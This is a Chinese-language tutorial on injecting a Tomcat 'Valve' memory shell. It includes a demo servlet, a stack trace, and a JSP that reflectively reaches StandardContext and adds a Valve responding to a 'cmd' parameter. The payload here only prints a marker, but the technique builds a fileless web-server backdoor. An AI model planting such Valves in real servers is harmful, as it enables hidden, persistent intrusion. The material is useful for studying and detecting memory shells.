# valve 内存马

新增一个Servlet，对该Servlet下断点并触发断点
```java
package servlet;

import javax.servlet.*;
import java.io.IOException;

public class demo implements Servlet {
    @Override
    public void init(ServletConfig config) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        res.getWriter().write("valve test page");
        res.getWriter().flush();
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}

```
触发断点之后的堆栈如下
```
service:19, demo (servlet)
internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilter:52, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
invoke:197, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:151, inject_jsp$1 (org.apache.jsp)
invoke:543, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:135, StandardHostValve (org.apache.catalina.core)
invoke:92, ErrorReportValve (org.apache.catalina.valves)
invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:367, CoyoteAdapter (org.apache.catalina.connector)
service:639, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:885, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1693, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:750, Thread (java.lang)
```
从上面的堆栈可以在到达Servlet之前请求经过了四个Valve的处理，分别是StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve，这四个Valve都继承了ValveBase，而ValveBase又继承了Contained，StandardContext等四个类也继承了Contained，所以只需要获取到StandardContext就能调用getPipeline获取相应的管理并进行修改。
```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Valve" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %><%--
  Created by IntelliJ IDEA.
  User: Luc
  Date: 2022/12/20
  Time: 15:03
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field standardContext = applicationContext.getClass().getDeclaredField("context");
    standardContext.setAccessible(true);
    StandardContext standardContext1 = (StandardContext) standardContext.get(applicationContext);

    ValveBase  valve = new ValveBase() {
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            if (request.getParameter("cmd")!=null){
                response.getWriter().write("valve 注入");
            }else {
                this.getNext().invoke(request,response);
            }
        }
    };

    standardContext1.getPipeline().addValve(valve);
%>
<html>
<head>
    <title>Title</title>
</head>
<body>

</body>
</html>

```